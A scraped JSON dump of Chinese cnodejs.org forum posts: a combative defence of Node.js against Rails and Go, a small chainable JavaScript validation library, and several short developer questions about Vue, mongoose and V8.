微服务</td>\n<td>移动互联网时代Api的作用被放大，故而独立分类。尤其是对于微服务开发更是利器</td>\n</tr>\n<tr>\n<td>ThinkJS</td>\n<td>面向新特性</td>\n<td>借鉴ThinkPHP，并慢慢走出自己的一条路，对于Async函数等新特性支持，无出其右，新版v3.0是基于Koa v2.0的作为内核的</td>\n</tr>\n<tr>\n<td>Koa</td>\n<td>专注于异步流程改进</td>\n<td>下一代Web框架</td>\n</tr>\n<tr>\n<td>Egg</td>\n<td>基于Koa，在开发上有极大便利</td>\n<td>企业级Web开发框架</td>\n</tr>\n</tbody>\n</table>\n<p>各种框架都经过大厂小厂实践，别的语言实现的我敢说Node都有了。还有什么所谓的更好实践，从2005年rails横空出世之后，大部分框架都是借鉴ROR，Node就算没有走到最前面，至少没有落后于最佳实践，否则，请给出，否则，请闭嘴，别瞎逼逼。</p>\n<blockquote>\n<p>大公司也是相继开发自己基于 koa 的框架。</p>\n</blockquote>\n<p>悖论，去哪儿的基于Express用的杠杠的，无任何问题。Node不缺Web框架，Koa虽好，但迁移各种还需要时间，未来是变化的，Koa能否一统天下还犹未可知。可以肯定的是Koa在异步流程控制做的改进，命名为Node下一个Web框架是不过分的。</p>\n<p>比如micro，比如fastify，非常多好东西。</p>\n<blockquote>\n<p>不过在我一个 Rails 使用者的眼里，这些框架还是不够 high level如果性能要求高，我的选择肯定是 Go 而不是 Node。</p>\n</blockquote>\n<p>用rails的人还考虑性能么？我不是黑ror的朋友们。rails这样的神器足够好，即使ruby以前性能那么不好，但不影响人家开发很多世界级应用啊。尽管后面有的被替换了，但又怎样呢？做ror的高手技能都非常全面，ruby和前端和运维都是极其的熟练。当然Node和go也有这样的人，但普遍偏弱，这不是人的问题，而是产生的时间较短，没背景的人就不能出现全栈牛逼的能力。</p>\n<p>如果真追求性能，我建议用rust写，如果还想牛逼，用c写，最好顺便把操作系统也写了。</p>\n<p>人还是要有自知之明，做应用软件和系统软件是不一样的思维。傻逼才只看性能呢。</p>\n<blockquote>\n<p>Node 除了亲 JS 好像对我没啥吸引力。但是如果公司非要用我也不反对，大不了自己摸爬滚打找出最佳实践即可。</p>\n</blockquote>\n<p>没用过，请绕过。我特别尊重苏千和朴灵，推动Node在阿里落地，比如苏千做的cnpm真是功德无量，比如Egg，能够统一全公司的资源去推动框架落地，可预见大公司阻力。朴灵的alinode解决了性能调优的问题，内部使用的经验沉淀，对外提供付费服务。</p>\n<p>这是人物。做的比说的多，低调如此，也不去惹是非。用德艺双馨形容不为过。</p>\n<blockquote>\n<p>Node 还有一个好处是 UI 做的好，比如 pm2，比如调试器，毕竟是前端，但这些都不是杀手级的卖点呀。我不是挑语言的开发者。</p>\n</blockquote>\n<p>Node 和 UI有关系么？呵呵呵</p>\n<blockquote>\n<p>Node 对我属于一个可用可不用位置。不过相信牛逼的你肯定可以玩转 Node。加油吧少年。我对Node新人的建议是玩一玩可以，</p>\n</blockquote>\n<p>没用过，就别瞎逼逼。</p>\n<p>js已经横跨3端，pc/h5，移动端（hybrid和组件化），pc client（nw.js和electron，atom和vscode体验还不错）</p>\n<p>Node补足了js服务端的补足，比如io，比如过于依赖浏览器。</p>\n<ul>\n<li>1）初衷，server端，不想成了前端开发的基础设施</li>\n<li>2）命令行辅助工具，甚至可以是运维</li>\n<li>3）移动端：cordova，pc端：nw.js和electron</li>\n<li>4）组件化，构建，代理</li>\n<li>5）架构，前后端分离、api proxy</li>\n<li>6）性能优化、反爬虫与爬虫</li>\n<li>\n<ol>\n<li>全栈最便捷之路</li>\n</ol>\n</li>\n</ul>\n<blockquote>\n<p>不过要早点转 Go，因为 Node 并没有什么突出的优势。</p>\n</blockquote>\n<p>Go在服务器端，并发模型上确实很好。做后端是极好的选型。但在前后端分离或者单体应用里，真的合适么？</p>\n<p>前面说了，性能并不是继续选型的唯一因素，不然ror那些牛人早转了。我一直的看法是前端离不开node，api层node有优势，io密集和脚本动态，做api组装聚合类的非常合适。对于后端服务，Node也是可以的，不过这时的node和go是一样的，尤其是上了微服务架构，服务是独立的，和语言无关，按照其特性选就好了，何必扯一些没用的。</p>\n<p>最后说一下Node全栈</p>\n<p>每次演讲我会都问大家是不是前端，回答“是”的人非常多，我会开玩笑的恭喜大家：“现在的前端就是钱端”，确实，现在前端发展异常的快，而且没有趋向于类比java里ssh框架的那种稳定，所以未来很长一段时间，还会增长，持续混乱，这对前端来说是把双刃剑，一方面有很强的压迫感，不学习就跟不上时代，另一方它也是机遇，能够带给更多机会，包括money。</p>\n<p>大家都疑惑的一个问题是如何在这样巨变的时代能够通过学习来应变，我可以很负责的告诉大家，没有捷径，但通过掌握 Node.js 能够让你降低这个学习曲线而已，毕竟Node.js是大前端的基础设施。大家可以看一下，前端的开发过程，模块化，构建，辅助工具，调优，架构调整，可以说Node.js是无处不在的。</p>\n<p>其实，辅助大前端开发只是Node.js的一个非常无心插柳的衍生功能，通过掌握Node.js能够让你能做的更多、获得的更多，甚至可以说有更多自我实现的快乐，在后面的章节会详细讲解Node.js的具体应用场景好处，这也是本书名字里“更了不起的”要去阐述的内容。</p>\n<p>综上种种，就是我一直提倡以 JavaScript 语言为中心的 <code>Node全栈</code> 概念的缘由，JavaScript 覆盖所有前端，Node.js 擅长做 I/O 密集型的后端，外加辅助开发的各种基础设施，无疑是工作、学习和成为快速掌握全栈技术最好的途径。你会的越多，你能做的就更多，你的人生也将会有不一样的精彩篇章。</p>\n<h1>补充</h1>\n<h2>没有领袖？</h2>\n<p>笑死了，根本就是外行，Node的接力棒是 TJ 和 sindresorhus ？ryan走了， Isaac Schlueter接✋的好么，然后是TJ Fontaine。之后闹出了iojs分裂问题，后来促使joyent不得不妥协，成立Node基金会。\n现在是纯社区玩法，背后是Node基金会。</p>\n<p>可以说，任何人离开都不会有特别大影响。铁打的营盘流水的兵，而已。</p>\n<p>TJ是想对Node改进的，但Node的负担太重了，现有体系和机制改变不是易事，而且也没有动力促使它改变。很多特性都是意淫的，根本不是Node设计的场景，所以说这些没意义。响马大哥的fibjs就是一个不错的实践，但为什么二者不融合呢？。。。。因为没法真的没法这样做。。。</p>\n<h2>拿 express 和 Rails 对比，是一样东西么？</h2>\n<blockquote>\n<p>我知道不能把 Node 跟 Rails 一起比，因为一个是平台，一个是框架。那我就详细拿 express 和Rails 比吧。express 可以说是提供了一个 RESTful API + MVC 的框架，本身既没有 orm 也没有提供各方面的脚手架（对比 Rails 的 scaffold）也没有提供任何主观性的集成（比如你需要自己搭建测试框架）</p>\n</blockquote>\n<p>进一步暴漏无知。express本身只是内核加了几个实用中间价的微型框架。Rails呢？是一个一站式的顶级Web框架。rails在2005年横空出世，node是2009年产生，exprss是2010年才有，这个比较客观么？</p>\n<p>谬误1:express 可以说是提供了一个 RESTful API + MVC 的框架</p>\n<p>a）谁说express是RESTful API了？</p>\n<p>明显要自己规约才能实现的，这也意淫到express上。。。sinatra呢，beego，Revel，Martini呢？</p>\n<p>express上实现rest可以，但不能这叫。</p>\n<pre class=\"prettyprint\"><code>var express = require(&#x27;express&#x27;);\nvar router = express.Router();\n\nvar $ = require(&#x27;..&#x2F;controllers&#x2F;users_controller&#x27;);\n\n&#x2F;&#x2F; -- custom\n\n&#x2F;**\n * Auto generate RESTful url routes.\n *\n * URL routes:\n *\n *  GET    &#x2F;users[&#x2F;]        =&gt; user.list()\n *  GET    &#x2F;users&#x2F;new       =&gt; user.new()\n *  GET    &#x2F;users&#x2F;:id       =&gt; user.show()\n *  GET    &#x2F;users&#x2F;:id&#x2F;edit  =&gt; user.edit()\n *  POST   &#x2F;users[&#x2F;]        =&gt; user.create()\n *  PATCH  &#x2F;users&#x2F;:id       =&gt; user.update()\n *  DELETE &#x2F;users&#x2F;:id       =&gt; user.destroy()\n *\n *&#x2F;\n\nrouter.get(&#x27;&#x2F;new&#x27;, $.new);  \nrouter.get(&#x27;&#x2F;:id&#x2F;edit&#x27;, $.edit);\n\nrouter.route(&#x27;&#x2F;&#x27;)\n  .get($.list)\n  .post($.create);\n\nrouter.route(&#x27;&#x2F;:id&#x27;)\n  .patch($.update)\n  .get($.show)\n  .delete($.destroy);\n\n\nmodule.exports = router;\n</code></pre><p>b）谁说express是MVC了？</p>\n<p>express目录有router和view就算mvc了？呵呵，看看rails，thinkjs，eggjs行么？</p>\n<pre class=\"prettyprint\"><code>├── app.js\n├── bin\n│   └── www\n├── package.json\n├── public\n│   ├── images\n│   ├── javascripts\n│   └── stylesheets\n│       └── style.css\n├── routes\n│   ├── index.js\n│   └── users.js\n└── views\n    ├── error.jade\n    ├── index.jade\n    └── layout.jade\n\n7 directories, 9 files\n</code></pre><p>c）谁说express是和rails一样的框架了？</p>\n<p>你可以这也理解express只是内核（插件机制） + 几个常用插件。是一个麻雀虽小，五脏俱全的微型框架。一个连基本约定，orm，脚手架，migrate都没有的框架也算框架？</p>\n<p>express不会直接使用的。大部分情况都是要自己封装的，如果说直接拿express-generator做事儿，做分析的，那真是用浅尝辄止形容不为过。</p>\n<p>d）说express不如rails</p>\n<p>确实不如，本来就不是一样的东西。ruby诞生自93年，rails诞生2005年，node和express呢？</p>\n<p>起点不一样，比较有意义么？</p>\n<h2>Node哲学 与 Left-pad事件始末，真了解？</h2>\n<blockquote>\n<p>Node 社区的哲学是可以把 left pad 作为一个包，这看起来真的很傻。</p>\n</blockquote>\n<p>明明不知道事件始末就乱发表意见，是否得当？是够傻的。</p>\n<p>2016年3月份，kik是Azer写的模块，但Kik同时是手机通信录的社交软件，所以这个社交软件上就无耻的直接说让Azer把kik名字给他们，Azer不同意，他们就拿律师函恐吓，并让npm妥协，所以npm就妥协了</p>\n<p>Azer一怒之下将自己在 npm 上的 273 个封包全部撤下，其中就包括 left-pad 封包。一石激起千层浪，依赖 left-pad 的上千个项目包括 babel 和 react-native 瞬间崩溃。大量开发者看着自己项目构建失败，顿时被吓尿。</p>\n<p>观点</p>\n<ul>\n<li>\n<p>1）就没见过这么傻逼的公司，一个红包就能解决的事儿，非要用强权，如果对方在改模块上耗费心血少的话，转给你也是可以商量的。</p>\n</li>\n<li>\n<p>2）11行代码要不要封装成一个包？</p>\n</li>\n</ul>\n<blockquote>\n<p>sindresorhus: Containing complexity is not about putting everything in one-line functions/modules.</p>\n</blockquote>\n<p>社区一致认可的结论：你的模块必须含有一定的复杂性，不然就没啥意义了。</p>\n<ul>\n<li>3）npm上那么多个模块，大多数都是无意义的吧？</li>\n</ul>\n<p>从我开始讲<a href=\"https://github.com/i5ting/nodejs-fullstack\">Node.js全栈</a>大约是3月份，那是npm上是25.6万个吧，截止到2017年3月是45万个，我想说的是那个包仓库都是有好有坏，按照80/20原则，数量是也是相当可观的。总比那些某些语言连包管理机制都不完善的要强太多了吧！</p>\n<ul>\n<li>4）<a href=\"http://blog.npmjs.org/post/141905368000/changes-to-npms-unpublish-policy\">迫使npm调整了撤销策略</a>，模块一旦发布，24小时之后就不让撤销了</li>\n</ul>\n<blockquote>\n<p>If the version is less than 24 hours old, you can unpublish it. The package will be completely removed from the registry.</p>\n</blockquote>\n<h2>这世界是完美的？</h2>\n<pre class=\"prettyprint\"><code>没用过别逼逼我不同意，我在做新的项目之前仔细对比了 Node Web 框架与其他框架，发现 Node 的上述问题，才使用了别的。\n我不认为我一定要用过之后再来逼逼。\n你也是做过项目的，知道如果一个项目做毁了会有多大损失，我不会为了来逼逼而去做毁一个项目。\n如果你技术一般，我建议你先别用 Node，因为会让你的技术更一般。\n如果你技术很牛，我不需要建议你什么，你牛你先说。\n</code></pre><p>没用过就是没用过，很多精髓的东西如果停留在表面，是不是太肤浅了？哪个框架是完美的？了解敏捷么？敏捷的基础认知是什么？</p>\n<p>从上面那express和rails比，从对express是rest+mvc的描述，暴漏对node了解太浅。如果说想黑node，我再帮你补二刀，早年robbin范凯，一直在黑node的回调地狱，可是又如何呢？该有多人用还是有多少人用</p>\n<p>有种你别装，装了就别瞎比比，既想当婊子，又想立牌坊吗？</p>\n<p>至于项目能否做成功，我并不认为是技术的问题。更多的是你对技术的熟练程度，哪个熟悉就用哪个，你哪个自己不熟悉的，做毁了，然后来骂框架，骂语言？这也是神逻辑啊。</p>\n<p>狼叔经常说：“少抱怨，多思考，未来更美好”，适用于所有人。</p>\n<h2>人员参差不齐要说人员参差不齐， Node 社区说第二，有哪个敢说第一？</h2>\n<pre class=\"prettyprint\"><code>PHP 好歹也是专注 Web 后台。Node 可笑的地方在于一群前端以为自己会后端就来写 Web 后台。我没有数据支持，但是我就是这么认为的。\nJava 后台的新人也是第一天就会专注于后台方面的学习。\n当然这并不能作为你不使用 Node 的原因，如果你是大神，你不会在乎这个社区有多少小白的。但是我前面也说了，我关注的大神都从 Node 社区走了啊。我为什么还要进 Node 社区……\n阿里的苏千我在阿里的时候也有向他请教 Node 方面的知识，我从未否认他们的贡献，不过我并不会因此捧 Node。\n</code></pre><p>PHP专注于Web 后台，我估计看了这话，鸟哥会哭的很伤心的。Node的人不是可笑，是有追求，慢慢写着写着就在成长。</p>\n<p>Java 后台的新人也是第一天就会专注于后台方面的学习？呵呵，没学Java么？去看看core java吧，上来学后台，没见过。</p>\n<p>关注的大神都从 Node 社区走了，这话更扯淡。哪个社区不是这样的？不同年龄，职位，人生阶段，关注点会不一样的。比如严清zensh就从node转了go，人家职位也不一样了。再有说话不要用“都”，我举个例子朴灵，<a href=\"https://cnodejs.org/user/JacksonTian%EF%BC%8C%E5%A4%A7%E5%AE%B6%E5%8E%BB%E7%9C%8B%E7%9C%8B%E4%BB%96%E7%9A%84%E6%9C%80%E8%BF%91%E5%8F%82%E4%B8%8E%E7%9A%84%E8%AF%9D%E9%A2%98%EF%BC%8C10%E5%A4%A9%E5%89%8D%E7%9A%84%E3%80%82https://cnodejs.org/topic/5a20be0a110a338547d6e371#5a24c72b9178b0a14ac01e1b\">https://cnodejs.org/user/JacksonTian，大家去看看他的最近参与的话题，10天前的。https://cnodejs.org/topic/5a20be0a110a338547d6e371#5a24c72b9178b0a14ac01e1b</a></p>\n<p>最后，再说一件事儿，别老贴金，进了阿里不代表什么，马云说了，三年以上才算阿里人，才有阿里味。向玉伯，寒冬，苏千，朴灵，天猪等大大们致敬。</p>\n<h2>Hold 不住？</h2>\n<blockquote>\n<p>Node 呢，请问我该用什么数据库？用什么 ORM？用什么模板语言？用什么做后台任务？如何监控内存？如何分析日志？如何做分布式？如何做安全？有些人看说用 Node 做业务速度快，Node 的框架就做那么点低层次的封装，能不快吗？你把各种中间件加完试试？每个领域都要自己去找最佳实践，然后自己集成起来。</p>\n</blockquote>\n<p>先不论对node和express等理解错误的问题。</p>\n<p>先看狼叔之前的回复 <a href=\"https://www.zhihu.com/question/263855387/answer/273769595\">https://www.zhihu.com/question/263855387/answer/273769595</a></p>\n<p>一般，后端开发指的是 <code>Web</code> 应用开发中和视图渲染无关的部分，但现在架构升级，<code>Node</code> 承担了前后端分离重任之后，有了更多玩法。从带视图的传统 <code>Web应用</code> 和 <code>面向Api接口应用</code>，到通过 <code>RPC</code> 调用封装对数据库的操作，到提供前端 <code>Api</code> 代理和网关，服务组装等，统称为后端开发，不再是以往只有和数据库打交道的部分才算后端，这样，就可以让前端工程师对开发过程可控，更好的进行调优和性能优化。</p>\n<p>对Node.js来说，一直没有在后端取得其合理的占有率。原因很简单</p>\n<ul>\n<li>\n<p>1）利益分配，已有实现大多是Java或者其他语言，基本是没法撼动的，重写的成本是巨大的，另外，如果用Node写了，那么那些写Java的人怎么办？抢人饭碗，这是要拼命的。</p>\n</li>\n<li>\n<p>2）Node相对年轻，大家对Node的理解不够，回调和异步流程控制略麻烦，很多架构师都不愿意花时间去学习。尽管在Web应用部分处理起来非常简单高效，但在遇到问题时并不容易排查定位，对开发者水平要求略高。</p>\n</li>\n<li>\n<p>3）开发者技能单一，很多是从前端转过来的，对数据库，架构方面知识欠缺，对系统设计也知之不多，这是很危险的，有种麻杆打狼两头害怕的感觉。</p>\n</li>\n<li>\n<p>4）Node在科普、培训、布道等方面做的并不好，国外使用的非常多，国内却很少人知道，不如某些语言做得好。</p>\n</li>\n</ul>\n<p>了不起是个不能随便说的词儿，对于 Node.js 来说，简化并发编程，用了不起来形容并不过分，在2009年横空出世时，确实是独一无二的。但在今天，已经8岁的 Node.js 有了更多、更为广泛的应用场景，它已经远远大于当初设计时的初衷了，我觉得用更了不起来形容已经不过分了！</p>\n<p>你这个问题，很明显暴漏了自己的问题就是上面的原因之3。</p>\n<blockquote>\n<p>开发者技能单一，很多是从前端转过来的，对数据库，架构方面知识欠缺，对系统设计也知之不多，这是很危险的，有种麻杆打狼两头害怕的感觉。</p>\n</blockquote>\n<p>不懂架构，不懂数据库，还没有明白人带，那你用啥框架，语言能好呢？</p>\n<ul>\n<li>1）复用已有基础设施，很明显比自己造轮子好。别动不动就java已死，xx已死的，冰冻三尺非一日之寒</li>\n<li>2）微服务架构下，你需要多复杂？</li>\n</ul>\n<p>不懂不可怕，别装懂。</p>\n<h2>UI 是 User Inferface，意思是 Node 社区做的工具的外观（UI）都很漂亮。</h2>\n<blockquote>\n<p>pm2 的 UI（命令行界面）我就很喜欢，Node 内容 Chrome 调试（界面）我也很喜欢，这是 UI，我不是说 GUI。程序员之间说 UI 难道不是既包括 GUI 又包括 CLI 吗？这只是对于术语的误解而已，不重要。</p>\n</blockquote>\n<p>各位看官自己判断这句话吧。</p>\n<h2>所以 NodeJS 社区很明智，多多模仿其他成熟框架是对的。但我直接去看你模仿的框架就好。？</h2>\n<p>举例，我想学日语，结果发现日语里有汉语的影子，于是我去学了汉语？是这逻辑么？</p>\n<p>水是原子组成的，干嘛喝水呢？去喝原子啊，反正有很多途径。。。</p>\n<h2>JS 全栈</h2>\n<blockquote>\n<p>我不知道这有什么意义？为了全栈而全栈？Java 二十年前也有一样的口号，然后呢？而且 JS 现在已经很奇怪了。</p>\n</blockquote>\n<p>目前看js是最容易实现全栈的途径，没有之一。我很喜欢ror，但同时学2种还是略难。其他就更不要说了。Java是跨平台，能和JS一样么？你真的了解从applet到awt到swing到他们衰亡的历史么？不见得吧，说话还是要有理有据的。</p>\n<p>全栈是信仰，是一种积极的人生态度。何谓为了全栈而全栈?我看到的更多的是大家积极的学习，努力的向提高成长。在技术变化如此快的今天，我们不是更该如此么？我尊重每一个有全栈信仰的人，我也祝福你们，未来是你们的。</p>\n<p>关于语言他回复的2个点</p>\n<ul>\n<li>我对Node新人的建议是玩一玩可以，不过要早点转 Go，因为 Node 并没有什么突出的优势。</li>\n<li>我宁愿用 Java 都不会用 Node.js，除非工资特别高</li>\n</ul>\n<p>一会扯go，一会扯java，难道对这门语言很熟悉的？还是纯粹为了挑起语言战争？还是为了培训机构站台？</p>\n<p>大家姑妄言之，姑妄笑之就好，别认真，认真你就输了</p>\n<p>朴大说过：“为什么非要尝试去说服傻逼”，可怜之人必有可恨之处，但不容许有人黑我大Node。</p>\n</div>","title":"狼叔回复的《Node相比传统服务端技术栈好在哪里？》","last_reply_at":"2019-04-29T01:45:12.311Z","good":true,"top":false,"reply_count":29,"visit_count":10461,"create_at":"2017-12-14T14:23:35.819Z","author":{"loginname":"i5ting","avatar_url":"https://avatars3.githubusercontent.com/u/3118295?v=4&s=120"}},{"id":"5cc3ab1ca86ae80ce64b48eb","author_id":"580339330bab808265185e45","tab":"share","content":"<div class=\"markdown-text\"><p>源码：<a href=\"https://github.com/wtfjun/js-coi\">git仓库</a> 欢迎star &amp; fork ～～</p>\n<p>做过校验需求的小伙伴们都知道，校验其实是个麻烦事。</p>\n<p>规则多，需要校验的字段多，都给我们前端带来巨大的工作量。</p>\n<p>一个不小心，代码里就出现了不少<code>if else</code>等不可维护的代码。</p>\n<p>因此，我觉得一个团队或者是一个项目，需要一个校验工具，简化我们的工作。</p>\n<p>首先，参考一下 Joi。只看这一小段代码：</p>\n<p><code>Joi.string().alphanum().min(3).max(30).required()</code></p>\n<p>我希望我的校验工具Coi也是链式调用，链式调用可以极大的简化代码。</p>\n<p>校验呢，其实主要就3个入参：需要校验的数据，提示的错误信息，校验规则。</p>\n<p>哎 直接把代码贴出来吧，反正就一百行，一目了然：</p>\n<pre class=\"prettyprint\"><code>export default class Coi {\n    constructor(prop) {\n        this.input = prop\n        this.errorMessage = &#x27;通过校验&#x27; &#x2F;&#x2F; 错误信息\n        this.pass = true &#x2F;&#x2F; 校验是否通过\n    }\n\n    &#x2F;&#x2F; 数据输入\n    data(input) {\n        if (!this.pass) return this\n\n        this.input = input\n        return this\n    }\n\n    &#x2F;&#x2F; 必填，不能为空\n    isRequired(message) {\n        if (!this.pass) return this\n\n        if (\n            &#x2F;^\\s*$&#x2F;g.test(this.input) ||\n            this.input === null ||\n            this.input === undefined\n        ) {\n            this.errorMessage = message\n            this.pass = false\n        }\n        return this\n    }\n\n    &#x2F;&#x2F; 最小长度\n    minLength(length, message) {\n        if (!this.pass) return this\n\n        if (this.input.length &lt; length) {\n            this.errorMessage = message\n            this.pass = false\n        }\n        return this\n    }\n\n    &#x2F;&#x2F; 最大长度\n    maxLength(length, message) {\n        if (!this.pass) return this\n\n        if (this.input.length &gt; length) {\n            this.errorMessage = message\n            this.pass = false\n        }\n        return this\n    }\n\n    &#x2F;&#x2F; 需要的格式 number: 数字, letter: 字母, chinese: 中文\n    requireFormat(formatArray, message) {\n        if (!this.pass) return this\n        let formatMap = {\n            number: 0,\n            letter: 0,\n            chinese: 0\n        }\n\n        Object.keys(formatMap).forEach(key =&gt; {\n            if (formatArray.includes(key)) formatMap[key] = 1\n        })\n\n        let formatReg = new RegExp(\n            &#96;^[${formatMap.number ? &#x27;0-9&#x27; : &#x27;&#x27;}${\n                formatMap.letter ? &#x27;a-zA-Z&#x27; : &#x27;&#x27;\n            }${formatMap.chinese ? &#x27;\\u4e00-\\u9fa5&#x27; : &#x27;&#x27;}]*$&#96;\n        )\n\n        if (!formatReg.test(this.input)) {\n            this.errorMessage = message\n            this.pass = false\n        }\n        return this\n    }\n\n    &#x2F;&#x2F; 邮箱校验\n    isEmail(message) {\n        if (!this.pass) return this\n\n        const emailReg = &#x2F;^[a-z0-9]+([._\\\\-]*[a-z0-9])*@([a-z0-9]+[-a-z0-9]*[a-z0-9]+.){1,63}[a-z0-9]+$&#x2F;\n        if (!emailReg.test(this.input)) {\n            this.errorMessage = message\n            this.pass = false\n        }\n        return this\n    }\n\n    &#x2F;&#x2F; ulr校验\n    isURL(message) {\n        if (!this.pass) return this\n\n        const urlReg = new RegExp(\n            &#x27;^(?!mailto:)(?:(?:http|https|ftp):&#x2F;&#x2F;|&#x2F;&#x2F;)(?:\\\\S+(?::\\\\S*)?@)?(?:(?:(?:[1-9]\\\\d?|1\\\\d\\\\d|2[01]\\\\d|22[0-3])(?:\\\\.(?:1?\\\\d{1,2}|2[0-4]\\\\d|25[0-5])){2}(?:\\\\.(?:[0-9]\\\\d?|1\\\\d\\\\d|2[0-4]\\\\d|25[0-4]))|(?:(?:[a-z\\\\u00a1-\\\\uffff0-9]+-?)*[a-z\\\\u00a1-\\\\uffff0-9]+)(?:\\\\.(?:[a-z\\\\u00a1-\\\\uffff0-9]+-?)*[a-z\\\\u00a1-\\\\uffff0-9]+)*(?:\\\\.(?:[a-z\\\\u00a1-\\\\uffff]{2,})))|localhost)(?::\\\\d{2,5})?(?:(&#x2F;|\\\\?|#)[^\\\\s]*)?$&#x27;,\n            &#x27;i&#x27;\n        )\n        if (!urlReg.test(this.input)) {\n            this.errorMessage = message\n            this.pass = false\n        }\n        return this\n    }\n\n    &#x2F;&#x2F; 自定义正则校验\n    requireRegexp(reg, message) {\n        if (!this.pass) return this\n\n        if (!reg.test(this.input)) {\n            this.errorMessage = message\n            this.pass = false\n        }\n        return this\n    }\n}\n</code></pre><p>使用姿势如下：</p>\n<pre class=\"prettyprint\"><code>import Coi from &#x27;js-coi&#x27;\n\nconst validCoi = new Coi()\nvalidCoi\n    .data(&#x27;1234&#x27;)\n    .isRequired(&#x27;id不能为空&#x27;)\n    .minLength(3, &#x27;id不能少于3位&#x27;)\n    .maxLength(5, &#x27;id不能多于5位&#x27;)\n\n    .data(&#x27;1234@qq.&#x27;)\n    .isRequired(&#x27;邮箱不能为空&#x27;)\n    .isEmail(&#x27;邮箱格式不正确&#x27;)\n\n    .data(&#x27;http:dwd&#x27;)\n    .isRequired(&#x27;url不能为空&#x27;)\n    .isUrl(&#x27;url格式不正确&#x27;)\n\nif (!validCoi.pass) {\n    this.$message.error(validCoi.errorMessage)\n    return\n}\n</code></pre><p>当然你只校验一个字段的话也可以这么使用：</p>\n<pre class=\"prettyprint\"><code>import Coi from &#x27;js-coi&#x27;\n\nconst idCoi = new Coi(&#x27;1234&#x27;)\nidCoi\n    .isRequired(&#x27;id不能为空&#x27;)\n    .minLength(3, &#x27;id不能少于3位&#x27;)\n    .maxLength(5, &#x27;id不能多于5位&#x27;)\n    .isEmail(&#x27;id邮箱格式不正确&#x27;)\n    .isUrl(&#x27;id格式不正确&#x27;)\n    .requireFormat([&#x27;number&#x27;, &#x27;letter&#x27;, &#x27;chinese&#x27;], &#x27;id格式不正确&#x27;)\n    .requireRegexp(&#x2F;012345&#x2F;, &#x27;id格式不正确&#x27;)\n\nif (!idCoi.pass) {\n    this.$message.error(idCoi.errorMessage)\n    return\n}\n</code></pre></div>","title":"一百行js代码实现一个校验工具","last_reply_at":"2019-04-28T15:01:31.717Z","good":false,"top":false,"reply_count":2,"visit_count":546,"create_at":"2019-04-27T01:06:36.289Z","author":{"loginname":"wtfjun","avatar_url":"https://avatars1.githubusercontent.com/u/17716658?v=4&s=120"}},{"id":"5cc584dba86ae80ce64b51ac","author_id":"59f007c928137001719a81e9","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FokXQcwJAN6D5nQj0qyPVmlwo-dC\" alt=\"QQ图片20190428184631.png\"></p>\n<p>谷歌里面 查看 vue .webpack   ?为什么 看不到 html 内容 .只能看到  js部分  ??</p>\n<p>如图所示 .这是以前写的一个项目 源码丢了.现在要重写 ,突然发现 看不了html 的内容 .</p>\n<p>#@</p>\n</div>","title":"谷歌里面 查看 vue .webpack   ?为什么 看不到 html 内容 .只能看到  js部分?","last_reply_at":"2019-04-28T10:47:55.637Z","good":false,"top":false,"reply_count":0,"visit_count":542,"create_at":"2019-04-28T10:47:55.637Z","author":{"loginname":"1016716110","avatar_url":"https://avatars2.githubusercontent.com/u/30174358?v=4&s=120"}},{"id":"55d1bd159bdae50c477e6ea1","author_id":"54914b4161491ead0cc7bee1","tab":"ask","content":"<div class=\"markdown-text\"><pre class=\"prettyprint language-javascript\"><code>var mongoose = require(&#x27;mongoose&#x27;);\nvar db = mongoose.createConnection(&#x27;mongodb:&#x2F;&#x2F;xxxxxxxxxxxxxxxxx&#x2F;test&#x27;);\n\ndb.on(&#x27;error&#x27;, function(error) {\n    console.log(error);\n});\n\nvar downloadSchema = new mongoose.Schema({\n    assets :  {type: String},\n    body :  {type: String},\n    tag_name :  {type: String},\n    date :  {type: String},\n});\n\nvar mongooseModel = db.model(&#x27;download&#x27;, downloadSchema);\n\nmongooseModel.find(function(error,result){\n    if(error) {\n        console.log(err);\n    } else {\n        console.log(result); &#x2F;&#x2F; result 为空\n    }\n    db.close();\n});\n</code></pre><p>第一次用mogoose,搞了很久都没搞定,不知道原因出在哪里</p>\n</div>","title":"mongoose查询不出来数据?","last_reply_at":"2019-04-28T08:36:31.246Z","good":false,"top":false,"reply_count":8,"visit_count":4450,"create_at":"2015-08-17T10:53:09.960Z","author":{"loginname":"w88975","avatar_url":"https://avatars.githubusercontent.com/u/5819351?v=3&s=120"}},{"id":"5cc2745c37faec0ce1d06e67","author_id":"5b03c9a7000332b81cf821a5","tab":"ask","content":"<div class=\"markdown-text\"><p>在V8的性能分析日志中有这个术语，但是这个术语是什么意思呢？</p>\n</div>","title":"V8，什么是lazy compile？","last_reply_at":"2019-04-28T08:04:12.256Z","good":false,"top":false,"reply_count":1,"visit_count":679,"create_at":"2019-04-26T03:00:44.346Z","author":{"loginname":"linxiaoziruo","avatar_url":"https://avatars3.githubusercontent.com/u/6881273?v=4&s=120"}},{"id":"5addecaaa7d228c16b9871e1","author_id":"5933d569bce3132e4bb4f8d5","tab":"share","content":"<div class=\"markdown-text\"><p>有兴趣可以看看 <a href=\"https://github.com/yviscool/egg-pig\">egg-pig</a></p>\n</div>","title":"把 nest 的 pipe/guard/interceptor 移植到了 egg","last_reply_at":"2019-04-28T07:44:29.852Z","good":false,"top":false,"reply_count":4,"visit_count":1277,"create_at":"2018-04-23T14:24:42.809Z","author":{"loginname":"yviscool","avatar_url":"https://avatars2.githubusercontent.com/u/20163909?v=4&s=120"}},{"id":"5cc5498b37faec0ce1d07928","author_id":"5cc546de37faec0ce1d0790a","tab":"share","content":"<div class=\"markdown-text\"><h3>功能列表：</h3>\n<ul>\n<li>转换，编辑和生成Markdown表格、CSV、JSON、XML、YAML、SQL、HTML表格、Excel和LaTeX表格</li>\n<li>可视化表格创建器</li>\n<li>类似于Excel的表格编辑器，同时支持键盘和鼠标操作</li>\n<li>提取网址中的表格</li>\n<li>LaTex table生成器</li>\n<li>自定义输出模板（IDEA）</li>\n<li>压缩XML、JSON、HTML等</li>\n</ul>\n<h3>截止v1.0.9，支持下面这些格式的转换</h3>\n<h5>1. Excel 转换器</h5>\n<ul>\n<li>将Excel转换为Markdown表格</li>\n<li>将Excel转换为CSV/TSV</li>\n<li>将Excel转换为JSON</li>\n<li>将Excel转换为XML</li>\n<li>将Excel转换为YAML</li>\n<li>将Excel转换为create表格 SQL and insert SQL</li>\n<li>将Excel转换为HTML表格</li>\n<li>将Excel转换为LaTex表格</li>\n<li>将Excel转换为Plain Text表格</li>\n</ul>\n<h5>2.URL 